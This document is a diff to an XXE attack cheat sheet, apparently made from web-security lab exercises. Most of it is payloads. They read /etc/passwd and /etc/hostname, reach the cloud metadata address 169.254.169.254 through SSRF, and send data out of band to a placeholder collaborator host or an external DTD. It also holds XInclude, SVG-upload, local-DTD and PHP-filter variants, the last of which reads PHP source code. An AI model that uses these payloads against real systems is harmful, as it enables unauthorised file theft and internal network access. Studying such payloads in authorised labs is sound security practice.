@@ -1,4 +1,6 @@
-//Basic Exploiting XXE using external entities to retrieve files
+#!/usr/bin/peno
+
+#Basic Exploiting XXE using external entities to retrieve files
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>			//this line has been inserted
 <stockCheck>
@@ -7,7 +9,7 @@
 </stockCheck>
 
 
-//Exploiting XXE to perform SSRF attacks
+#Exploiting XXE to perform SSRF attacks
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/admin"> ]>		//this line has been inserted
@@ -16,13 +18,13 @@
 <storeId>1</storeId>
 </stockCheck>
 
-//Blind XXE with out-of-band interaction
+#Blind XXE with out-of-band interaction
 
 <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
 .. 
 &xxe;
 
-//Blind XXE with out-of-band interaction via XML parameter entities
+#Blind XXE with out-of-band interaction via XML parameter entities
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
 
 //Exploiting blind XXE to exfiltrate data using a malicious external DTD
@@ -33,10 +35,10 @@
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>								//On Repeater
 
 
-//Exploiting XInclude to retrieve files
+#Exploiting XInclude to retrieve files
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 
-//Exploiting XXE via image file upload
+#Exploiting XXE via image file upload
 
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
@@ -44,8 +46,8 @@
 <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
 
-//Exploiting XXE to retrieve data by repurposing a local DTD
-//Insert the following parameter entity definition in between the XML declaration and the stockCheck element
+#Exploiting XXE to retrieve data by repurposing a local DTD
+#Insert the following parameter entity definition in between the XML declaration and the stockCheck element
 <!DOCTYPE message [
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
@@ -56,3 +58,13 @@
 '>
 %local_dtd;
 ]>
+
+
+#PHP Filters with XXE to read the source code of the files on the webserver
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=info.php" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
